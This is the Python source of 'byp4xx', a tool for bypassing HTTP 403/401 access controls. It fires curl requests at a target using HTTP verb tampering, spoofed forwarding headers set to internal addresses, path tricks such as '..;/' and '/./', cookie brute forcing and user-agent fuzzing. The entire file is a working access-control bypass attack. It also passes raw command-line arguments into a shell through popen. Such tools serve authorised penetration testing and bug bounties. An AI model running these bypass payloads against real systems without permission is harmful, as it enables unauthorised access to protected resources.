#!/usr/bin/python3
import sys
from os import popen


payloads = {
	"METHODS":open('./lists/MethodsHTTP.txt'),
	"HEADERS":open('./lists/HeadersHTTP.txt'),
	"AGENTS":open('./lists/UserAgents.txt'),
	"VCOOKIES":open('./lists/CookiesValues.txt'),
	"NCOOKIES":open('./lists/CookiesNames.txt'),
	"PATH": ["2e", "./", "?", "??", "//", "/./", "/", "/.", "/.randomstring", "..\;/", "/.\;/", "\;foo=bar/"]
}
def banner():
	print('\033[92m    __                 \033[91m__ __           ')
	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
	print('\033[92m  / __ \/ / / / __ \ \033[91m/ // /_| |/_/ |/_/')
	print('\033[92m / /_/ / /_/ / /_/ /\033[91m/__  __/>  <_>  <  ')
	print('\033[92m/_.___/\__, / .___/   \033[91m/_/ /_/|_/_/|_|  ')
	print('\033[92m      /____/_/                        ')
	print('by: @lobuhisec \033[0m')
	print('')

#Defining the standard curl calling. Default options used: -k -s -I (HEAD method) 
#Code is returned already colored
def curl_code_response(options_var, payload_var):
	code = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options_var, payload_var)).read()

	#If we use -x proxy curl option then we must take the third line of the response
	if "-x" in options_var:
		code = code.split('\n',3)[2]
	else:
		code = code.split('\n',1)[0]

	try:
		status = code.split(" ")[1] # Status code is in second position
	except:
		print("\033[91m Status not found \033[0m")
		return # consider using sys.exit(1)

	#200=GREEN
	if status == "200":
		code = "\033[92m"+code+"\033[0m"
	#30X=ORANGE
	elif status.startswith("30"):
		code = "\033[93m"+code+" TIP: Consider to use -L option to follow redirections\033[0m"
	#40X or 50X=RED
	elif  status.startswith("40") or  status.startswith("50"):
		code = "\033[91m"+code+"\033[0m"
	return code

def main():
	#Check all params
	if len(sys.argv)<2:
		print("Usage: ./byp4xx <cURL options> <target>")
		sys.exit(1)

	#Parse curl options and target from args
	options = ' '.join(sys.argv[1:len(sys.argv)-1])
	target = sys.argv[len(sys.argv)-1]

	#Check if URL starts with http/https
	if not target.startswith("http"):
		print("Usage: ./byp4xx <cURL options> <target>")	
		print("URL parameter does not start with http:// or https://")
		sys.exit(1)

	#Count "/" on target param just to parse the last part of URI path
	bar_count = target.count("/")
	if target.endswith("/"):
		bar_count = bar_count -1

	if bar_count == 2:
		url = target
		uri = ""
	else:
		aux =  target.split("/")
		url = "/".join(aux[:bar_count])
		uri = aux[bar_count]

	###########TESTS start here!!!!
	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
	payload = url + "/" + uri
	for custom_payload in payloads['METHODS'].read().splitlines():
		print(f"Method: {custom_payload} > ",curl_code_response(f"{options} -X {custom_payload}",payload))
	print("")
	###########HEADERS
	print('\033[92m\033[1m[+]HEADERS\033[0m')
	for custom_payload in payloads['HEADERS'].read().splitlines():
		for value_custom_payload in ["127.0.0.1", "http://127.0.0.1/", "http://127.0.0.1", "http://192.168.1.1", "192.168.1.1", "http://0.0.0.0", "0.0.0.0", payload]:
			print(f"{custom_payload}: {value_custom_payload} > ",curl_code_response(f'{options} -X GET -H "{custom_payload}: {value_custom_payload}"',payload))
	print("")
	###########BUGBOUNTY
	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')

	for custom_payload in payloads['PATH']:
		payload=f'{url}/{custom_payload}/{uri}'
		payload_sec=f'{url}/{uri}/{custom_payload}'
		print(f"start with: {payload} > ",curl_code_response(options+" -X GET",payload))
		print(f"start with (path as is): {payload} >  ",curl_code_response(options+" -X GET --path-as-is",payload))
		print(f"end with: {payload_sec} > ",curl_code_response(options+" -X GET",payload_sec))
		print(f"end with (path as is): {payload_sec} >  ",curl_code_response(options+" -X GET --path-as-is",payload_sec))
		
	print("")

	###########Cookies Brute Force
	payload=url+"/"+uri
	response=input("Do you want to try with Cookies Brute Force ? [y/N]: ")
	if response.lower() == 'n' or response == "":
		sys.exit(1)
	else:
		for value_cookie in payloads['VCOOKIES'].read().splitlines():
			for name_cookie in payloads['NCOOKIES'].read().splitlines():
				print(f"{name_cookie}={value_cookie} :" + curl_code_response(f'{options} -X GET -H "Cookie: {name_cookie}={value_cookie}"',payload))

	print("")
	###########UserAgents
	response=input("Do you want to try with UserAgents.fuzz.txt from SecList? (2454 requests) [y/N]: ")
	if response.lower() == 'n' or response == "":
		sys.exit(1)
	else:
		print('\033[92m\033[1m[+]UserAgents\033[0m')
		  
		for line in payloads['AGENTS'].read().splitlines():
			print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))

if __name__ == "__main__":
	try:
		banner()
		main()
	except KeyboardInterrupt:
		print("Aborting...")
	except Exception as e:
		print(e)
